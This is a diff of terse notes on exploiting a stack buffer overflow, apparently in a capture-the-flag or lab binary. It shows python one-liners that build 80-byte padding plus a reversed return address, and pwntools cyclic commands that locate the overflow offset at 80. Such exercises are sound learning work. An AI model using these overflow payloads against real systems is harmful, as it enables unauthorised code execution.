@@ -14,4 +14,16 @@ run <<< $(python -c 'print ("-" * 80 + "AAAA")')
 
 $(python -c 'print "-" * 80 + "\x08\x04\x84\xe2"[::-1] ')
 
-there is not system() therefore no shell to jump to
+there is no system() therefore no shell to jump to
+
+cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Segmentation fault. 
+0x61616175
+
+unhex 61616175 | rev ; echo ""
+uaaa
+
+cyclic -l uaaa
+80
